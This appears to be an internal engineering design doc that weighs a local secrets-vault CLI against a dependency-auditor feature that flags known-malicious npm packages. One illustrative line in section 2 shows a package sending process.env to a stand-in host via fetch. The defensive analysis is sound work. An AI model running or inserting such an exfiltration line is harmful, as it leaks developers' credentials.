# Problem 6: Secrets Hydration for Secure Local Environments — Breakdown & Feasibility Check

## Verdict up front

**Real problem, wrong solution, already solved (multiple times, better).**
The stolen-laptop sub-problem gets a marginal improvement from this design.
The "bad npm package" sub-problem — the one actually named in the ticket —
is **not solved by this design at all**, because `process.env` has no
privilege boundary in Node: any dependency loaded into the same process can
read exactly what this tool injects. Encryption-at-rest doesn't change that.
Direct prior art (`dotenvx`, `aws-vault`, `envchain`, `1Password CLI`,
`Infisical`, `direnv`+`sops`) already does the "no plaintext on disk" part,
for free, audited, cross-platform. The differentiator worth actually
building lives in `monorepo-dep-auditor` itself, not in a new vault CLI.

---

## 1. The problem statement, in plain language

Two distinct threats are bundled into one sentence:

1. **Malicious npm package steals secrets.** A compromised or malicious
   dependency, running with full filesystem access inside your app's Node
   process, greps for `.env`, `~/.aws/credentials`, etc., and exfiltrates
   them. This is real and ongoing — e.g. the 2025 "Shai-Hulud" npm worm and
   the 2018 `eslint-scope` compromise both did exactly this.
2. **Stolen laptop exposes secrets.** If the disk (or an unlocked/decrypted
   session, or a cloud-synced backup) is accessed, plaintext `.env` files
   are readable.
3. **Enterprise vaults (Vault Enterprise, some SaaS tiers) cost money** and
   are seen as overkill for a single dev laptop.

The proposed fix: encrypt secrets at rest, decrypt into memory only, inject
into `process.env` at process boot, never touch disk in plaintext.

---

## 2. Does the proposed solution solve either threat?

**Threat 2 (stolen laptop): partially, and only if key management is done
right.** Encrypting the vault helps only if the decryption key isn't sitting
next to the ciphertext (a config file, a hardcoded machine ID) — otherwise
it's security theater, trivially reversed. And most laptops already have
FileVault/BitLocker on by default, which covers the "disk at rest, powered
off" case already. The marginal gain is: protecting against backup/sync
leakage (Time Machine, iCloud, Dropbox accidentally syncing `.env`) and
against an unlocked-but-idle session. That's a real, if narrow, win.

**Threat 1 (malicious npm package): not solved, full stop.** This is the
one actually named in the ticket, and it's the one the design doesn't touch.
Node has no process isolation between "your code" and "a dependency's
code" — they share one heap, one `process.env`, one filesystem access
level. A malicious package doesn't need to find a `.env` file on disk; it
just does:

```js
console.log(process.env) // or fetch('https://evil.example', { body: JSON.stringify(process.env) })
```

...and gets exactly what this tool just injected, at the exact moment it's
most concentrated (all secrets, hydrated, guaranteed present). If anything,
a global `process.env` hydration step makes the attacker's job *easier* than
today, where a package has to actually locate and parse a `.env` file
first. "In-memory, never written to disk" is a property that matters for
disk forensics and backup leakage — it is irrelevant to a threat model where
the attacker's code is already running inside the same process as the
secrets.

---

## 3. Is this already solved?

Yes, several times over, and the closest prior art matches this pitch
almost word for word:

| Tool | Approach | Notes |
|---|---|---|
| [`dotenvx`](https://dotenvx.com/) | Encrypts `.env` in place (`.env.vault`), decrypts at runtime via a private key kept out of the repo | This *is* the proposed pitch, shipped, OSS, free, by the original `dotenv` author. Largest install base of any option here. |
| [`aws-vault`](https://github.com/99designs/aws-vault) | Stores creds in OS keychain, injects into a subprocess's env, never on disk | Free, OSS, macOS/Linux/Windows, mature (7+ years). |
| [`envchain`](https://github.com/sorah/envchain) | OS keychain-backed, injects into env for one command | Free, OSS, does exactly "in-memory, never disk." |
| `direnv` + [`sops`](https://github.com/getsops/sops)/[`age`](https://github.com/FiloSottile/age) | Encrypted file, decrypted per-shell via hook | Free, OSS, KMS/PGP/age-backed key management done right. |
| [Infisical](https://infisical.com/) | Self-hostable secrets manager, `infisical run -- <cmd>` injects into env | Free/OSS tier exists — the "expensive enterprise vault" framing doesn't hold once you know this exists. |
| [1Password CLI](https://developer.1password.com/docs/cli/) (`op run`) | Pulls from vault, injects into subprocess env | Affordable team pricing, not just enterprise-only. |
| HashiCorp Vault (OSS core) + Vault Agent | Agent injects env vars from a local dev-mode Vault | Free core; "enterprise" pricing only applies to enterprise features, not the whole product. |

**Implication:** building a new CLI here duplicates `dotenvx` almost
exactly, and duplicates `aws-vault`/`envchain` in spirit. The "expensive
vault" framing in the ticket is a strawman — free, OSS, locally-runnable
options already exist and are years more mature/audited than anything built
from scratch would be in month one.

---

## 4. Where the real, unsolved value is

None of the tools above stop threat 1 (co-resident malicious code reading
`process.env`), because it isn't a secrets-storage problem — it's a
**process-trust-boundary problem**. The actual leverage points:

- **Node's permission model** (`node --permission`, stable since Node 20.x,
  hardening since) can restrict filesystem/network access per-run. It's the
  only mechanism that changes the *access*, not just the *storage*, of
  secrets — and it's a platform feature, not something worth
  re-implementing.
- **Short-lived, scoped credentials** (OIDC federation, STS tokens, 15-minute
  DB tokens) beat any encryption scheme: if a secret is stolen, the blast
  radius is a 15-minute window, not "until manually rotated." This is
  higher-leverage than hiding a long-lived static secret better.
- **Dependency-side detection**, which is squarely in this repo's lane:
  `monorepo-dep-auditor` already inspects the dependency graph. Flagging
  packages (or their transitive deps) that access `process.env`, read
  `.env`/`.npmrc`/`~/.aws`, or make network calls at install/require time is
  a legitimate, currently under-served signal — closer to a lightweight
  `socket.dev`/`npq` check than a vault product.
- **Selective injection over ambient global env** — pass secrets explicitly
  to the specific modules that need them instead of hydrating all of
  `process.env` globally, shrinking what any given piece of code (trusted
  or not) can see.

---

## 5. Recommendation

- **Don't build a new encrypted-vault CLI.** Adopt `dotenvx` (closest match
  to the pitch, zero new problems) or `aws-vault`/`envchain` if OS-keychain
  backing is preferred over a vault file.
- **Do treat "bad npm package reads secrets" as a supply-chain-detection
  problem**, not a storage problem — that's a `monorepo-dep-auditor`
  feature (flag deps touching `process.env`/`.env`/credential paths), not a
  new binary.
- **Do push for short-lived/scoped credentials** wherever the backing
  system supports it (cloud IAM, DB proxies) — this reduces real risk more
  than any local encryption scheme, because it shrinks the exposure window
  instead of trying to hide a long-lived secret from code that already runs
  in the same process as it.

**Next:** confirm whether the actual goal is "stop a stolen laptop from
leaking `.env`" (→ adopt `dotenvx`/`aws-vault`, done in an afternoon) or
"detect malicious deps reading secrets" (→ scope a dep-auditor rule, this is
the genuinely unsolved half).

---

## 6. Elaboration: the dep-auditor detection rule

### 6.1 What problem this actually is

Not "hide secrets better." The problem is **a monorepo has hundreds to
thousands of transitive dependencies, any one of which can turn malicious
after you already depend on it**, and nothing in this repo's toolchain
currently checks for that. Recent, real cases:

- **Shai-Hulud worm (Sept 2025)** — compromised npm packages (`@ctrl/tinycolor`
  and ~500 others) whose postinstall scripts scanned the filesystem/env for
  cloud credentials and npm tokens, then used the stolen npm token to infect
  packages the victim maintained, self-propagating downstream.
- **`event-stream` (2018)** — a maintainer handoff introduced a payload
  targeting a specific downstream wallet app, hidden inside a transitive dep
  (`flatmap-stream`), invisible to a name-only glance at `package.json`.
- **`eslint-scope` (2018)**, **`ua-parser-js` (2021)**, **`coa`/`rc` (2021)**
  — account-takeover publishes of extremely widely-used packages, each
  shipping a credential-stealing payload for a few hours before detection.

The common thread: the malicious code enters **as a version bump of a
package already in the tree**, usually several levels down in the
transitive graph, not something a human reviewed. By the time it's
disclosed (hours to days later, via npm/GitHub advisories or OSV.dev), the
question for any given team is purely mechanical: *"do we have that exact
name+version pinned anywhere in this monorepo, right now?"* That's a
question this tool is already 90% built to answer.

### 6.2 Why this is currently unaddressed, and who it hits

`monorepo-dep-auditor` today (`src/rules/banned-packages.ts`) already walks
every workspace's manifest, resolves installed versions, and flags a match
against a name (and optional version range) — but only for names a human
typed into `bannedPackages` in the config ahead of time. Nobody hand-types
the name of a package before it's known to be malicious; that's the whole
problem. So today:

- A team using this auditor in CI gets **zero signal** if a transitive
  dependency they already depend on is later disclosed as compromised.
  The tool has no notion of "known-bad," only "manually-declared-bad."
- The exposure is silent and can persist indefinitely: nobody re-audits a
  lockfile against yesterday's disclosures unless they specifically go
  looking, and a large monorepo can easily have a compromised package sitting
  three levels deep in a transitive tree nobody reads by hand.
- This is exactly the kind of drift the existing rules (`banned-packages`,
  `peer-consistency`) already exist to catch for version-consistency
  problems — the same CI gate just doesn't extend to "known-malicious,"
  which is arguably the higher-severity class of the two.

One honest caveat, stated plainly: this can't stop a *brand-new* zero-day at
the moment of compromise — by the time a package is on a known-bad list,
`npm install` has often already run its postinstall script on whichever
machine installed it first. The realistic, valuable claim is **fast drift
detection**: on every CI run (which is often daily/per-PR), catch that a
now-known-bad name+version is pinned somewhere in the monorepo, within one
CI cycle of disclosure — turning "nobody notices for weeks" into "next PR's
audit step fails," which is the same "shift left, CI-time check" pattern
already recommended as the highest-leverage move in the Problem 5 doc
(`docs/2026-09-runtime-env-validation.md`).

### 6.3 Proposed solution — scoped to what this codebase already does

**Don't build a new rule type or a source-code scanner first.** The
existing `banned-packages` check already does 100% of the mechanical work
needed (name match, optional range match, per-workspace resolution,
`Violation` output, all 5 reporters). The only missing piece is *where the
names come from*.

1. **Ship a bundled, periodically-updated denylist of known-malicious
   package name+version entries**, sourced from a maintained public feed —
   [OSV.dev's malicious-packages
   ecosystem](https://osv.dev/) (backed by
   [`ossf/malicious-packages`](https://github.com/ossf/malicious-packages),
   OpenSSF-maintained, free, structured JSON) is the right source: don't
   curate this by hand, don't build a scraper, consume the feed that
   security researchers already maintain full-time.
   - Snapshot it into the package at release time (matches this tool's
     existing offline-only design — `config.ts` deliberately has no
     network calls, no plugin system) and refresh the snapshot on every
     `monorepo-dep-auditor` release, same as any other dependency bump.
   - Merge it with the user's own `bannedPackages` config array at the same
     merge point `checkBannedPackages` already reads from — same function,
     same `Violation["rule"] === "banned-packages"`, no new rule, no new
     reporter changes, no new config surface beyond one opt-out flag
     (`disableKnownMalwareFeed?: boolean`, off by default so it's not a
     silent breaking change for existing config files).
   - Trade-off to flag honestly: a bundled snapshot is only as fresh as the
     last `monorepo-dep-auditor` release. A live-fetch-at-runtime version
     would be fresher but breaks the tool's offline/no-network guarantee
     and adds "trust this feed server at audit time" as a new supply-chain
     surface of its own — worth calling out to whoever owns this decision,
     not worth deciding silently either way here.

2. **Explicitly not recommended as a first step: heuristic source-code
   scanning** (grepping installed packages' JS for `process.env` co-occurring
   with `fetch`/`http.request` in the same file, to catch *undisclosed*
   exfiltration). This is real signal in principle, but:
   - It duplicates, with far less engineering investment, what
     Socket.dev/`npq`/Snyk already do full-time with much lower
     false-positive rates (they track thousands of behavioral signals, not
     one grep pattern).
   - It will flag legitimate packages constantly — `dotenv` itself reads
     `.env` and touches `process.env` by design; any telemetry/analytics
     SDK touches both env and network legitimately. Shipping this as a
     hard failure would make teams turn the whole tool off within a week.
   - If this level of coverage is wanted, the lazier and more effective
     move is integrating an existing package-risk API (Socket.dev has a
     free tier API for exactly this score) as an optional data source,
     rather than building and maintaining a bespoke static analyzer.

### 6.4 Net recommendation

- Build item 1 only, first: bundle the OSV.dev malicious-packages snapshot,
  feed it into the existing `checkBannedPackages` alongside user-declared
  bans, refresh on release. This is a small, mechanical change to code that
  already exists, reuses every reporter and test fixture pattern already in
  `test/banned-packages*.test.js`, and turns "known-malicious transitive
  dependency" from an invisible risk into a CI-blocking `Violation` within
  one release cycle of public disclosure.
- Treat item 2 (behavioral/heuristic scanning) as a distinct, much larger,
  separately-justified project — and default to integrating an existing
  risk-scoring API over building one, if it's ever pursued at all.
